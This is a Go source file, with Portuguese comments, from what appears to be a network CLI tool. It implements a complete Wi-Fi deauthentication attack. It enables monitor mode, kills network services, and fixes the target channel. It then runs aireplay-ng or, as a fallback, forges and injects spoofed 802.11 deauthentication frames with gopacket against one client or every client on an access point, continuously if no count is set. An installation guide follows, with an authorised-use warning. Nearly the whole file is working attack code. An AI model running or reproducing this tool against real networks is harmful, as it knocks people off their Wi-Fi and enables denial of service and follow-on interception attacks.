package wifi

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/gabrifranca/cli_ping/internal/domain"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// ──────────────────────────────────────────────────────────────────────────────
// Verificação de Ferramentas
// ──────────────────────────────────────────────────────────────────────────────

// CheckDeauthTools verifica se as ferramentas do aircrack-ng estão instaladas.
// Retorna o caminho do aireplay-ng ou erro se não encontrar.
func CheckDeauthTools() (string, error) {
	aireplayPath, err := exec.LookPath("aireplay-ng")
	if err != nil {
		return "", fmt.Errorf("aireplay-ng não encontrado. Instale com: sudo apt install aircrack-ng")
	}
	return aireplayPath, nil
}

// checkAirmonNg verifica se airmon-ng está disponível para gerenciar modo monitor.
func checkAirmonNg() (string, error) {
	path, err := exec.LookPath("airmon-ng")
	if err != nil {
		return "", fmt.Errorf("airmon-ng não encontrado. Instale com: sudo apt install aircrack-ng")
	}
	return path, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// Gerenciamento de Monitor Mode
// ──────────────────────────────────────────────────────────────────────────────

// EnableMonitorMode coloca uma interface WiFi em modo monitor.
// Tenta primeiro via airmon-ng, depois via iw como fallback.
// Retorna o nome da interface em modo monitor (pode ser diferente, ex: wlan0mon).
func EnableMonitorMode(iface string) (string, error) {
	// Mata processos que podem interferir (NetworkManager, wpa_supplicant, etc.)
	_ = exec.Command("sudo", "airmon-ng", "check", "kill").Run()

	// Tenta via airmon-ng primeiro (mais confiável para a maioria dos drivers)
	airmonPath, err := checkAirmonNg()
	if err == nil {
		cmd := exec.Command("sudo", airmonPath, "start", iface)
		output, err := cmd.CombinedOutput()
		if err == nil {
			// airmon-ng pode renomear a interface (ex: wlan0 -> wlan0mon)
			monIface := parseMonitorInterface(string(output), iface)
			if monIface != "" {
				return monIface, nil
			}
			// Se não conseguiu parsear, verifica se a interface original está em monitor
			if isMonitorMode(iface) {
				return iface, nil
			}
			// Tenta o padrão wlan0mon
			monName := iface + "mon"
			if isMonitorMode(monName) {
				return monName, nil
			}
		}
	}

	// Fallback: usa iw diretamente
	// Desativa a interface
	_ = exec.Command("sudo", "ip", "link", "set", iface, "down").Run()

	// Define modo monitor
	cmd := exec.Command("sudo", "iw", iface, "set", "monitor", "none")
	if err := cmd.Run(); err != nil {
		// Tenta reativar a interface antes de retornar erro
		_ = exec.Command("sudo", "ip", "link", "set", iface, "up").Run()
		return "", fmt.Errorf("falha ao ativar modo monitor via iw: %w", err)
	}

	// Reativa a interface
	if err := exec.Command("sudo", "ip", "link", "set", iface, "up").Run(); err != nil {
		return "", fmt.Errorf("falha ao reativar interface %s: %w", iface, err)
	}

	if isMonitorMode(iface) {
		return iface, nil
	}

	return "", fmt.Errorf("não foi possível ativar modo monitor na interface %s", iface)
}

// DisableMonitorMode restaura a interface WiFi para modo managed (normal).
func DisableMonitorMode(iface string) error {
	// Tenta via airmon-ng primeiro
	airmonPath, err := checkAirmonNg()
	if err == nil {
		cmd := exec.Command("sudo", airmonPath, "stop", iface)
		if err := cmd.Run(); err == nil {
			// Reinicia o NetworkManager
			_ = exec.Command("sudo", "systemctl", "start", "NetworkManager").Run()
			return nil
		}
	}

	// Fallback: iw manual
	_ = exec.Command("sudo", "ip", "link", "set", iface, "down").Run()
	_ = exec.Command("sudo", "iw", iface, "set", "type", "managed").Run()
	_ = exec.Command("sudo", "ip", "link", "set", iface, "up").Run()
	_ = exec.Command("sudo", "systemctl", "start", "NetworkManager").Run()

	return nil
}

// SetChannel fixa o canal da interface WiFi para o canal do AP alvo.
func SetChannel(iface string, channel int) error {
	cmd := exec.Command("sudo", "iw", "dev", iface, "set", "channel", strconv.Itoa(channel))
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("falha ao fixar canal %d na interface %s: %w", channel, iface, err)
	}
	return nil
}

// isMonitorMode verifica se uma interface está em modo monitor.
func isMonitorMode(iface string) bool {
	cmd := exec.Command("iw", "dev", iface, "info")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "type monitor")
}

// parseMonitorInterface extrai o nome da interface monitor da saída do airmon-ng.
func parseMonitorInterface(output, originalIface string) string {
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		// Procura por "(monitor mode vhw enabled on wlan0mon)" ou similar
		if strings.Contains(line, "monitor mode") && strings.Contains(line, "enabled") {
			// Extrai o nome da interface entre parênteses ou no final
			parts := strings.Fields(line)
			for _, p := range parts {
				p = strings.Trim(p, "()")
				if strings.Contains(p, "mon") || strings.HasPrefix(p, originalIface) {
					if p != originalIface {
						return p
					}
				}
			}
		}
	}
	return ""
}

// ──────────────────────────────────────────────────────────────────────────────
// Orquestrador Principal
// ──────────────────────────────────────────────────────────────────────────────

// RunDeauth executa o ataque de deauthentication usando a melhor abordagem disponível.
// Tenta primeiro via aireplay-ng (mais estável), e faz fallback para injeção nativa via gopacket.
func RunDeauth(ctx context.Context, config domain.DeauthConfig, onOutput func(string)) (domain.DeauthResult, error) {
	// Valida os parâmetros obrigatórios
	if config.Interface == "" {
		return domain.DeauthResult{}, fmt.Errorf("interface WiFi não especificada")
	}
	if config.TargetBSSID == "" {
		return domain.DeauthResult{}, fmt.Errorf("BSSID do AP alvo não especificado")
	}

	// Define reason code padrão se não especificado
	if config.Reason == 0 {
		config.Reason = 7 // Class 3 frame received from nonassociated STA
	}

	// Fixa o canal do AP alvo na interface
	if config.Channel > 0 {
		if err := SetChannel(config.Interface, config.Channel); err != nil {
			if onOutput != nil {
				onOutput(fmt.Sprintf("[!] Aviso: %v", err))
			}
		}
	}

	// Abordagem A: tenta via aireplay-ng
	aireplayPath, err := CheckDeauthTools()
	if err == nil {
		if onOutput != nil {
			onOutput("[*] Usando aireplay-ng para deauthentication...")
		}
		result, err := runDeauthAireplay(ctx, config, aireplayPath, onOutput)
		if err == nil {
			return result, nil
		}
		if onOutput != nil {
			onOutput(fmt.Sprintf("[!] aireplay-ng falhou: %v — tentando injeção nativa...", err))
		}
	} else {
		if onOutput != nil {
			onOutput("[*] aireplay-ng não disponível, usando injeção nativa via gopacket...")
		}
	}

	// Abordagem B: fallback para injeção nativa via gopacket
	return runDeauthNative(ctx, config, onOutput)
}

// ──────────────────────────────────────────────────────────────────────────────
// Abordagem A — Wrapper aireplay-ng
// ──────────────────────────────────────────────────────────────────────────────

// runDeauthAireplay executa o deauthentication via aireplay-ng como subprocesso.
// Comando: aireplay-ng --deauth <count> -a <BSSID> [-c <client>] <interface>
func runDeauthAireplay(ctx context.Context, config domain.DeauthConfig, aireplayPath string, onOutput func(string)) (domain.DeauthResult, error) {
	start := time.Now()

	// Constrói os argumentos
	args := []string{"--deauth"}

	if config.Count > 0 {
		args = append(args, strconv.Itoa(config.Count))
	} else {
		args = append(args, "0") // 0 = contínuo
	}

	args = append(args, "-a", config.TargetBSSID)

	if config.ClientMAC != "" {
		args = append(args, "-c", config.ClientMAC)
	}

	args = append(args, config.Interface)

	// Executa o aireplay-ng
	cmd := exec.CommandContext(ctx, "sudo", append([]string{aireplayPath}, args...)...)

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return domain.DeauthResult{}, fmt.Errorf("erro ao criar pipe stdout: %w", err)
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		return domain.DeauthResult{}, fmt.Errorf("erro ao iniciar aireplay-ng: %w", err)
	}

	packetsSent := 0
	scanner := bufio.NewScanner(stdout)
	
	// aireplay-ng usa \r (carriage return) para atualizar a linha no terminal.
	// O scanner padrão do Go só quebra em \n, o que faz com que ele segure o buffer
	// e não mostre as atualizações ao vivo. Precisamos de um Split customizado.
	scanner.Split(func(data []byte, atEOF bool) (advance int, token []byte, err error) {
		if atEOF && len(data) == 0 {
			return 0, nil, nil
		}
		// Procura por \r ou \n
		if i := bytes.IndexAny(data, "\r\n"); i >= 0 {
			if i == 0 { // Ignora linhas vazias criadas por múltiplos \r\n
				return 1, nil, nil
			}
			return i + 1, data[0:i], nil
		}
		if atEOF {
			return len(data), data, nil
		}
		return 0, nil, nil
	})

	for scanner.Scan() {
		line := scanner.Text()
		if onOutput != nil {
			onOutput(line)
		}
		// Parseia a saída para contar pacotes enviados
		// Formato típico: "Sending 64 directed DeAuth (code 7). STMAC: [XX:XX:XX:XX:XX:XX]"
		if strings.Contains(line, "DeAuth") || strings.Contains(line, "deauth") {
			packetsSent++
		}
	}

	// Ignora erros de contexto cancelado (Ctrl+C é o fluxo normal)
	err = cmd.Wait()
	if ctx.Err() != nil {
		err = nil
	}

	result := domain.DeauthResult{
		PacketsSent: packetsSent,
		Duration:    time.Since(start),
		Method:      "aireplay-ng",
	}

	if err != nil {
		result.Error = err.Error()
		return result, err
	}

	return result, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// Abordagem B — Injeção Nativa via gopacket (802.11 Management Frames)
// ──────────────────────────────────────────────────────────────────────────────

// runDeauthNative constrói e injeta frames 802.11 Deauthentication diretamente
// via gopacket usando raw sockets. Não requer ferramentas externas.
func runDeauthNative(ctx context.Context, config domain.DeauthConfig, onOutput func(string)) (domain.DeauthResult, error) {
	start := time.Now()

	// Parseia o BSSID do AP
	apMAC, err := net.ParseMAC(config.TargetBSSID)
	if err != nil {
		return domain.DeauthResult{}, fmt.Errorf("BSSID inválido '%s': %w", config.TargetBSSID, err)
	}

	// Parseia o MAC do cliente (ou usa broadcast)
	var clientMAC net.HardwareAddr
	if config.ClientMAC != "" {
		clientMAC, err = net.ParseMAC(config.ClientMAC)
		if err != nil {
			return domain.DeauthResult{}, fmt.Errorf("MAC do cliente inválido '%s': %w", config.ClientMAC, err)
		}
	} else {
		clientMAC = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff} // Broadcast
	}

	// Abre a interface em modo monitor para injeção raw 802.11
	handle, err := pcap.OpenLive(config.Interface, 2048, true, pcap.BlockForever)
	if err != nil {
		return domain.DeauthResult{}, fmt.Errorf("erro ao abrir interface %s para injeção: %w", config.Interface, err)
	}
	defer handle.Close()

	if onOutput != nil {
		target := config.ClientMAC
		if target == "" {
			target = "FF:FF:FF:FF:FF:FF (broadcast — todos os clientes)"
		}
		onOutput(fmt.Sprintf("[*] Interface: %s", config.Interface))
		onOutput(fmt.Sprintf("[*] AP alvo (BSSID): %s", config.TargetBSSID))
		onOutput(fmt.Sprintf("[*] Cliente alvo: %s", target))
		onOutput(fmt.Sprintf("[*] Reason Code: %d", config.Reason))
		if config.Count > 0 {
			onOutput(fmt.Sprintf("[*] Pacotes a enviar: %d", config.Count))
		} else {
			onOutput("[*] Modo contínuo — pressione Ctrl+C para parar")
		}
		onOutput("")
	}

	packetsSent := 0

	for {
		select {
		case <-ctx.Done():
			result := domain.DeauthResult{
				PacketsSent: packetsSent,
				Duration:    time.Since(start),
				Method:      "gopacket-native",
			}
			return result, nil
		default:
			// Envia deauth AP -> Cliente (fingindo ser o AP)
			if err := sendDeauthFrame(handle, apMAC, clientMAC, apMAC, config.Reason); err != nil {
				if onOutput != nil {
					onOutput(fmt.Sprintf("[!] Erro ao injetar frame (AP→Cliente): %v", err))
				}
			} else {
				packetsSent++
			}

			// Envia deauth Cliente -> AP (fingindo ser o cliente)
			// Isso garante que o AP também derrube a associação
			if config.ClientMAC != "" {
				if err := sendDeauthFrame(handle, clientMAC, apMAC, apMAC, config.Reason); err != nil {
					if onOutput != nil {
						onOutput(fmt.Sprintf("[!] Erro ao injetar frame (Cliente→AP): %v", err))
					}
				} else {
					packetsSent++
				}
			}

			if onOutput != nil && packetsSent%10 == 0 {
				onOutput(fmt.Sprintf("[💀] Deauth frames enviados: %d | Tempo: %s",
					packetsSent, time.Since(start).Truncate(time.Second)))
			}

			// Verifica se atingiu a contagem desejada
			if config.Count > 0 && packetsSent >= config.Count {
				result := domain.DeauthResult{
					PacketsSent: packetsSent,
					Duration:    time.Since(start),
					Method:      "gopacket-native",
				}
				return result, nil
			}

			// Delay entre rajadas para não sobrecarregar o driver
			time.Sleep(50 * time.Millisecond)
		}
	}
}

// sendDeauthFrame constrói e injeta um único frame IEEE 802.11 Deauthentication.
//
// Estrutura do frame:
//
//	┌──────────────────────────────────────────────────────┐
//	│ RadioTap Header (adicionado automaticamente)         │
//	├──────────────────────────────────────────────────────┤
//	│ Dot11 Header:                                        │
//	│   Type:     Management (0x00)                        │
//	│   Subtype:  Deauthentication (0x0C)                  │
//	│   Address1: Destino (cliente ou broadcast)            │
//	│   Address2: Fonte (AP falsificado)                    │
//	│   Address3: BSSID                                    │
//	├──────────────────────────────────────────────────────┤
//	│ Deauth Body:                                         │
//	│   Reason Code: 7 (Class 3 frame)                     │
//	└──────────────────────────────────────────────────────┘
func sendDeauthFrame(handle *pcap.Handle, srcMAC, dstMAC, bssid net.HardwareAddr, reason uint16) error {
	// RadioTap header — obrigatório para injeção em modo monitor
	radioTap := &layers.RadioTap{
		Version: 0,
		Length:  8, // Tamanho mínimo do header RadioTap
	}

	// Frame 802.11 Management — Deauthentication
	dot11 := &layers.Dot11{
		Address1: dstMAC, // Receptor (cliente alvo ou broadcast)
		Address2: srcMAC, // Transmissor (fingindo ser o AP)
		Address3: bssid,  // BSSID do AP
		Type:     layers.Dot11TypeMgmtDeauthentication,
	}

	// Corpo do frame Deauth com o Reason Code
	deauth := &layers.Dot11MgmtDeauthentication{
		Reason: layers.Dot11Reason(reason),
	}

	// Serializa todas as camadas em bytes para injeção
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radioTap, dot11, deauth); err != nil {
		return fmt.Errorf("erro ao serializar frame deauth: %w", err)
	}

	// Injeta o frame na interface
	return handle.WritePacketData(buf.Bytes())
}

// ──────────────────────────────────────────────────────────────────────────────
// Instruções de Instalação
// ──────────────────────────────────────────────────────────────────────────────

// GetDeauthInstructions retorna instruções detalhadas para instalar as ferramentas necessárias.
func GetDeauthInstructions() string {
	return `
╔══════════════════════════════════════════════════════════════════════╗
║           GUIA: DEAUTHENTICATION ATTACK — REQUISITOS                ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ⚠️  APENAS LINUX — Não funciona no Windows/macOS                   ║
║                                                                      ║
║  PRÉ-REQUISITOS DE HARDWARE:                                        ║
║  • Placa WiFi com suporte a MODO MONITOR + INJEÇÃO DE PACOTES       ║
║  • Chipsets compatíveis: Atheros AR9271, Realtek RTL8812AU,          ║
║    Ralink RT3070, MediaTek MT7612U                                   ║
║  • Adaptadores populares: Alfa AWUS036ACH, Alfa AWUS036NHA,         ║
║    TP-Link TL-WN722N (v1 apenas)                                    ║
║                                                                      ║
║  INSTALAÇÃO DAS FERRAMENTAS (Debian/Ubuntu/Kali):                    ║
║  ┌──────────────────────────────────────────────────────────┐        ║
║  │  sudo apt update                                          │        ║
║  │  sudo apt install aircrack-ng                             │        ║
║  │                                                            │        ║
║  │  # Inclui: airmon-ng, aireplay-ng, airodump-ng            │        ║
║  └──────────────────────────────────────────────────────────┘        ║
║                                                                      ║
║  VERIFICAR SUPORTE DA PLACA:                                         ║
║  ┌──────────────────────────────────────────────────────────┐        ║
║  │  sudo airmon-ng                                           │        ║
║  │  # Deve listar sua placa WiFi                             │        ║
║  │                                                            │        ║
║  │  sudo aireplay-ng --test wlan0                            │        ║
║  │  # Testa se a placa suporta injeção de pacotes            │        ║
║  └──────────────────────────────────────────────────────────┘        ║
║                                                                      ║
║  NOTA: Se aireplay-ng não estiver disponível, o Ajin usará           ║
║  injeção nativa via gopacket (fallback automático).                   ║
║                                                                      ║
║  ⚠️  IMPORTANTE: Use APENAS em redes próprias ou com                 ║
║     autorização explícita. Deauth em redes alheias é ilegal.         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝`
}
